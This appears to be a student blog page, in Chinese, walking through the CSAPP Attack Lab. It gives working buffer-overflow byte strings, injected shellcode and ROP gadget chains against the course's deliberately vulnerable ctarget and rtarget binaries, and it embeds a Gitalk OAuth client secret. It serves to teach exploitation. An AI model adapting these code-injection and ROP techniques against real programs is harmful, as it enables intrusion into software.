@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Michael&#39;s Blog</title>
+
+  <!-- CSS  -->
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link href= "/css/materialize.css" type="text/css" rel="stylesheet" media="screen,projection"/>
+  <link href= "/css/github-markdown.css" type="text/css" rel="stylesheet"/>
+  <link href= "/css/custom.css" type="text/css" rel="stylesheet"/>
+  <link href= "/css/atom-one-dark.css" type="text/css" rel="stylesheet"/>
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Roboto:300,400" rel="stylesheet">
+</head>
+
+  <body>
+    <div>
+        <div class="hide-on-large-only navBlock grey darken-3 valign-wrapper">
+    <a href="#" data-target="slide-out" class="sidenav-trigger waves-effect waves-light white-text">
+        <i class="material-icons" style="font-size: 40px;margin-top:13px;margin-left:10px;float:left">menu</i>
+        <p style="float:left;font-size:24px;margin-top:16px;margin-left:10px">Michael's Blog</p>
+    </a>
+</div>
+
+<ul id="slide-out" class="sidenav sidenav-fixed grey darken-3">
+    <li id="personalInfoContainer">
+        <div class="user-view">
+            <div class="background grey darken-3">
+            </div>
+            <a href="#user"><img class="circle" src="/images/Yuuko.png"></a>
+            <a href="#name"><span class="white-text name">Michael</span></a>
+            <p class="white-text">CS student at CUHK.<p>
+            <a href="#email"><span class="white-text email">micintosh1998@gmail.com</span></a>
+        </div>
+        
+        <a class="waves-effect waves-light white-text" href="/tech"><i class="material-icons white-text">school</i>Academia</a>
+        
+        <a class="waves-effect waves-light white-text" href="/life"><i class="material-icons white-text">today</i>Life</a>
+        
+        <a class="waves-effect waves-light white-text" href="/stories"><i class="material-icons white-text">bookmark_border</i>Stories</a>
+        
+    </li>
+    
+        <div class="container" id="divider"><div class="divider"></div></div>
+        <div id="postIndicator"><div>
+        <li id="tocContainer">
+                <!-- Table of Contents -->
+                <div id="toc" class="toc-article white-text">
+                    <a href="#" class = "waves-effect waves-light hoverable" style="width:100%;" id="backToMenu">
+                        <strong class="toc-title valign-wrapper white-text"><i class="material-icons white-text" style="font-size: 1.5rem;margin-right:1.5rem;">menu</i>Table of contents</strong>
+                    <a>
+                    <div class="grey-text lighten-2">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Code-Injection-Attack"><span class="toc-number">1.</span> <span class="toc-text">Code Injection Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">1.1.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">1.2.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3"><span class="toc-number">1.3.</span> <span class="toc-text">Level 3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Return-Oriented-Programming"><span class="toc-number">2.</span> <span class="toc-text">Return Oriented Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4"><span class="toc-number">2.1.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-5"><span class="toc-number">2.2.</span> <span class="toc-text">Level 5</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+                    </div>
+                </div>
+        </li>
+    
+    <!-- <a href="#" data-target="slide-out" class="sidenav-trigger"><i class="material-icons">menu</i></a> -->
+</ul>
+
+        <main class="main">
+          <div class="container" id="postContent">
+    <h1>CSAPP Labs-Attack Lab</h1>
+    <div class="divider"></div>
+    <div class="markdown-body">
+        <p>这一实验要求我们利用Code Injection和Return Oriented Programming (ROP)两种方法来攻击两个程序。其中ctarget是可以用code injection攻击破解的，而rtarget因为使用了栈随机化和去除栈内存的执行权限，不能使用code injection，只能用ROP来攻击。</p>
+<p>不用多说，进攻开始！</p>
+<a id="more"></a>
+<p><br><br></p>
+<p><strong>等等！</strong>还有一些准备工作需要完成！根据handout所说，程序会执行test函数：</p>
+<pre><code class="c">void test() 
+{ 
+    int val; 
+    val = getbuf(); 
+    printf(&quot;No exploit. Getbuf returned 0x%x\n&quot;, val);
+}
+</code></pre>
+<p>其中getbuf函数为：</p>
+<pre><code class="c">unsigned getbuf()
+{
+    char buf[BUFFER_SIZE];
+    Gets(buf);
+    return 1;
+}
+</code></pre>
+<p>我们要利用缓冲区溢出让getbuf在返回时跳转到我们想要的位置。缓冲区的大小是多少呢？我们反汇编ctarget函数：</p>
+<pre><code class="assembly">00000000004017a8 &lt;getbuf&gt;:
+  4017a8:    48 83 ec 28              sub    $0x28,%rsp
+  4017ac:    48 89 e7                 mov    %rsp,%rdi
+  4017af:    e8 8c 02 00 00           callq  401a40 &lt;Gets&gt;
+  4017b4:    b8 01 00 00 00           mov    $0x1,%eax
+  4017b9:    48 83 c4 28              add    $0x28,%rsp
+  4017bd:    c3                       retq
+  4017be:    90                       nop
+  4017bf:    90                       nop
+</code></pre>
+<p>大小是0x28(dec 40)！也就是说，我们填入40 byte的信息之后，就可以修改返回地址啦！</p>
+<h1 id="Code-Injection-Attack"><a href="#Code-Injection-Attack" class="headerlink" title="Code Injection Attack"></a>Code Injection Attack</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>第一关需要我们让程序执行touch1这个函数。先看看touch1是什么样子的：</p>
+<pre><code class="c">void touch1()
+{
+    vlevel = 1; / * Part of validation protocol * / 
+    printf(&quot;Touch1!: You called touch1()\n&quot;);
+    validate(1);
+    exit(0);
+}
+</code></pre>
+<p>touch1不需要任何参数。那我们只需要把地址填到栈内相应的地方就好了。从反汇编的代码中我们知道touch1的地址为0x4017c0，所以可以构造出字符串：</p>
+<pre><code class="assembly">de ad be ef de ad be ef
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+c0 17 40 00 00 00 00 00 /* touch1 address */
+</code></pre>
+<p>注意Intel x86-64使用的是小端序（Little Endian），输入字符串的时候应该反转地址字节顺序。</p>
+<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>第二关需要我们执行touch2函数。先来看看touch2：</p>
+<pre><code class="c">void touch2(unsigned val)
+{ 
+    vlevel = 2; / * Part of validation protocol * / 
+    if (val == cookie) {
+        printf(&quot;Touch2!: You called touch2(0x%.8x)\n&quot;, val);
+        validate(2); 
+    }
+    else {
+        printf(&quot;Misfire: You called touch2(0x%.8x)\n&quot;, val);
+        fail(2); 
+    } 
+    exit(0);
+}
+</code></pre>
+<p>我们需要把cookie作为第一个参数传给touch2。cookie可以在handout文件夹中的cookie.txt中找到。要想将cookie放到%rdi（第一参数）中，可以使用mov指令。所以我们希望计算机先执行我们注入的指令，再跳转到touch2函数。汇编指令顺序为：</p>
+<pre><code class="assembly">ret                 #to the mov instruction below
+mov &lt;cookie&gt; %rdi
+ret                 #to 0x4017ec &lt;touch2&gt;
+</code></pre>
+<p>这就需要我们知道注入的代码的内存地址。好在ctarget每次执行内存地址是不会变化的。利用gdb工具我们可以通过查看%rsp的内容，知道运行时栈顶的位置。例如：</p>
+<pre><code class="bash">(gdb) x/24x $sp
+0x5561dc78:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5561dc88:    0x00000000    0x00000000    0x00000000    0x00000000
+0x5561dc98:    0x55586000    0x00000000    0x00401976    0x00000000
+0x5561dca8:    0x00000002    0x00000000    0x00401f24    0x00000000
+0x5561dcb8:    0x00000000    0x00000000    0xf4f4f4f4    0xf4f4f4f4
+0x5561dcc8:    0xf4f4f4f4    0xf4f4f4f4    0xf4f4f4f4    0xf4f4f4f4
+</code></pre>
+<p>所以我们可以把代码注入到0x5561dc78的位置，再让getbuf返回时跳转到这里。要注意的是我们注入的代码里面的ret的目标是栈顶的值，所以我们需要一个额外的pushq将touch2的地址放到栈顶。最终注入的代码为：</p>
+<pre><code class="assembly">pushq  $0x4017ec #touch2 address
+mov    &lt;cookie&gt;,%rdi
+ret
+</code></pre>
+<p>我们可以用gcc将其编译为机器码。再加上填充位和第一次ret的地址，最终字符串为：</p>
+<pre><code>68 ec 17 40 00          /* pushq  $0x4017ec &lt;touch2&gt; */
+48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */
+c3                      /* retq */
+c0 ff ee                 /* padding */
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+78 dc 61 55 00 00 00 00 /* top of stack */
+</code></pre><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>第三关需要我们执行touch3函数：</p>
+<pre><code class="c">void touch3(char * sval)
+{
+    vlevel = 3; / * Part of validation protocol * / 
+    if (hexmatch(cookie, sval)) 
+    {
+        printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
+        validate(3);
+    } 
+    else 
+    {
+        printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);
+        fail(3);
+    }
+    exit(0);
+}
+</code></pre>
+<p>这一函数的参数是一个字符串指针，指向的内容应该为cookie的字符串表示（去掉0x）。hexmatch会比对cookie字符串是否和cookie的十六进制表示对应。注意它在检查的时候会向栈内写入值，所以我们不能将cookie字符串放在hexmatch调用时栈顶以下（地址值低）的地方，以免被覆盖。我的做法是在注入的代码中人为将栈指针下移，保证字符串置于栈顶以上（地址值高）。剩下的思路和第二关类似，想注入的代码为：</p>
+<pre><code class="assembly">sub        0x28,%rsp
+pushq     $0x4018fa # touch3
+mov     &lt;pointer to string&gt;, %rdi
+ret
+</code></pre>
+<p>注意这里字符串指针需要预先计算好位置，再根据这个地址调整填充位的长度（mov对应的机器码长度可能改变）。将编译后的机器码和cookie字符串的二进制表示一并注入，最后的字符串为：</p>
+<pre><code>48 83 ec 28             /* sub    0x28,%rsp */
+68 fa 18 40 00          /* pushq $0x4018fa */
+48 c7 c7 91 dc 61 55    /* mov 0x5561dc91, %rdi */
+c3                      /* retq */
+c0 ff ee                /* padding */
+de ad be ef ff            /* padding */
+35 39 62 39 39 37 66 61 /* cookie */
+00 c0 ff ee c0 ff ee    /* 00-&gt; end of string */
+78 dc 61 55 00 00 00 00    /* top of stack */
+</code></pre><h1 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return Oriented Programming"></a>Return Oriented Programming</h1><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p>从这一关开始我们攻击的目标换成了rtarget。rtarget内提供了一系列函数作为配件农场(Gadget Farm)，我们可以用这些函数中的二进制指令组合出想要执行的代码。</p>
+<p>第四关需要我们执行touch2函数。根据handout的说明，这些配件农场中存在的指令为movq（从寄存器到寄存器）, popq,ret和nop。因此我们需要修改Level 2中的代码（之前使用了movq将内存地址移动到寄存器）。经过搜索可以发现，对我们有用的代码片段有：</p>
+<pre><code class="assembly">00000000004019ca &lt;getval_280&gt;:
+  4019ca:    b8 29 58 90 c3           mov    $0xc3905829,%eax         # pop rax @4019cc
+  4019cf:    c3                       retq
+
+00000000004019a0 &lt;addval_273&gt;:
+  4019a0:    8d 87 48 89 c7 c3        lea    -0x3c3876b8(%rdi),%eax     # mov rax, rdi @4019a2
+  4019a6:    c3                       retq
+</code></pre>
+<p>利用这些指令，我们可以执行：</p>
+<pre><code class="assembly">popq %rax
+mov %rax, %rdi
+ret
+</code></pre>
+<p>这样一来，我们只需要把cookie存在栈内，由第一条指令pop到rax中，再由第二条指令移动到rdi中作为参数即可。注意每一条指令返回时，栈顶必须为下一条指令的地址。所以栈的内容应该这样填充：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Note</th>
+<th style="text-align:center">Stack</th>
+<th style="text-align:center">Position</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">touch2</td>
+<td style="text-align:center">0x4017ec</td>
+<td style="text-align:center">rsp+24</td>
+</tr>
+<tr>
+<td style="text-align:center">mov %rax, %rdi</td>
+<td style="text-align:center">0x4019a2</td>
+<td style="text-align:center">rsp+16</td>
+</tr>
+<tr>
+<td style="text-align:center">cookie</td>
+<td style="text-align:center">cookie</td>
+<td style="text-align:center">rsp+8</td>
+</tr>
+<tr>
+<td style="text-align:center">pop %rax</td>
+<td style="text-align:center">0x4019cc</td>
+<td style="text-align:center">rsp</td>
+</tr>
+</tbody>
+</table>
+<p>输入的字符串如下：</p>
+<pre><code>de ad be ef de ad be ef
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+cc 19 40 00 00 00 00 00    /* pop %rax */
+fa 97 b9 59 00 00 00 00    /* cookie */
+a2 19 40 00 00 00 00 00    /* mov %rax, %rdi */
+ec 17 40 00 00 00 00 00    /* touch2 */
+</code></pre><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>这一关需要我们执行touch3函数。可以用的指令扩充了movl和一些functional no-op。但是仍然没有我们在Level 3中用到的sub指令。这一题有两个问题需要解决：</p>
+<ol>
+<li>如何获得cookie字符串指针的地址。因为采用了栈随机化，我们无法事先知道cookie字符串会被存放在哪里，不能使用Level 3中的方法。我们只有通过rsp来获得栈顶的位置，根据它来计算字符串指针。</li>
+<li>如何保证cookie字符串在栈顶之上。因为没有了add,sub和push指令，我们没有办法人为降低栈顶指针。而如果仅仅用rsp的值作为字符串指针，那么一旦rsp经过cookie字符串，字符串就一定会处于栈顶之下。</li>
+</ol>
+<p>基于这两点，唯一的方法就是在rsp的基础上增加一个偏移量。而这需要对指针进行运算。一开始我以为在指令种类受到限制的情况下，这是无法做到的。然而在观察代码的时候，在配件农场里发现了这一个函数：</p>
+<pre><code class="assembly">00000000004019d6 &lt;add_xy&gt;:
+  4019d6:    48 8d 04 37              lea    (%rdi,%rsi,1),%rax
+  4019da:    c3                       retq
+</code></pre>
+<p>我们可以直接调用这一函数来进行计算！经过观察发现农场中存在以rsi为目标的mov指令，这一操作是可以完成的。之前的思维受到寻找二进制指令的限制，竟然没有发现可以直接调用函数解决问题。这样一来题目的思路就明显了：</p>
+<ol>
+<li>将cookie字符串写到栈顶以上（写在touch3的地址之后）</li>
+<li>获得rsp和预计算的偏移量，跳转至add_xy算出字符串指针</li>
+<li>将指针放入%rdi中</li>
+<li>跳转至touch3函数</li>
+</ol>
+<p>接下来就需要寻找相应的代码片段完成上述操作了。需要注意的是movl指令只会移动寄存器的低位，如果内存地址非常大的话会出错。经过搜索发现从栈到%rsi的操作必须使用movl指令，而从栈到%rdi的不是。所以，偏移量必须作为add_xy的第一个参数，而rsp的地址则必须作为第二个参数。最终栈的内容如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Note</th>
+<th style="text-align:center">Stack</th>
+<th style="text-align:center">Position</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center">cookie string</td>
+<td style="text-align:center">rsp+72</td>
+</tr>
+<tr>
+<td style="text-align:center">touch3</td>
+<td style="text-align:center">0x4018fa</td>
+<td style="text-align:center">rsp+64</td>
+</tr>
+<tr>
+<td style="text-align:center">rax-&gt;rdi</td>
+<td style="text-align:center">0x4019a2</td>
+<td style="text-align:center">rsp+56</td>
+</tr>
+<tr>
+<td style="text-align:center">add_xy</td>
+<td style="text-align:center">0x4019d6</td>
+<td style="text-align:center">rsp+48</td>
+</tr>
+<tr>
+<td style="text-align:center">ecx-&gt;esi</td>
+<td style="text-align:center">0x401a13</td>
+<td style="text-align:center">rsp+40</td>
+</tr>
+<tr>
+<td style="text-align:center">edx-&gt;ecx</td>
+<td style="text-align:center">0x401a34</td>
+<td style="text-align:center">rsp+32</td>
+</tr>
+<tr>
+<td style="text-align:center">eax-&gt;edx</td>
+<td style="text-align:center">0x4019dd</td>
+<td style="text-align:center">rsp+24</td>
+</tr>
+<tr>
+<td style="text-align:center">bias</td>
+<td style="text-align:center">bias = 0x48 (dec 72)</td>
+<td style="text-align:center">rsp+16</td>
+</tr>
+<tr>
+<td style="text-align:center">bias-&gt;rax</td>
+<td style="text-align:center">0x4019cc</td>
+<td style="text-align:center">rsp+8</td>
+</tr>
+<tr>
+<td style="text-align:center">rax-&gt;rdi</td>
+<td style="text-align:center">0x4019a2</td>
+<td style="text-align:center">rsp</td>
+</tr>
+<tr>
+<td style="text-align:center">rsp-&gt;rax</td>
+<td style="text-align:center">0x401a06</td>
+<td style="text-align:center">rsp before ret</td>
+</tr>
+</tbody>
+</table>
+<p>因此，输入的字符串为：</p>
+<pre><code>de ad be ef de ad be ef
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+de ad be ef de ad be ef
+06 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+cc 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+dd 19 40 00 00 00 00 00
+34 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61 /* cookie */
+00 00 00 00 00 00 00 00 /* end of string */
+</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>那么到这里Attack Lab就完成了。这个实验Code Injection的部分比较直观，但是Return Oriented Programming部分需要一边整理思路一边在配件农场中寻找自己想要的指令，根据结果反过来调整自己的思路。写这篇文章的时候这些部分没有怎么体现出来，自己上手做可能才能真正体验到这种寻找的乐趣吧。那么，下一个Lab见～</p>
+
+    </div>
+    <link rel="stylesheet" href="/css/gitalk.css">
+<script src="/js/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '4d9730cc3432c4ae23a2',
+        clientSecret: '9ee5e04e412db75f2fd5e5b93c39a9da7f0c467b',
+        id: window.location.pathname,
+        repo: 'micint0sh.github.io',
+        owner: 'Micint0sh',
+        admin: 'Micint0sh',
+        distractionFreeMode: 'true'
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</div>
+
+        </main>
+    </div>
+
+    <!--Scripts-->
+    <script src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
+    <script type="text/javascript" src="/js/materialize.js"></script>
+    <script type="text/javascript" src="/js/highlight.pack.js"></script>
+    <script type="text/javascript" src="/js/highlightjs-line-numbers.js"></script>
+    <script type="text/javascript" src="/js/init.js"></script>
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+  </body>
+</html>
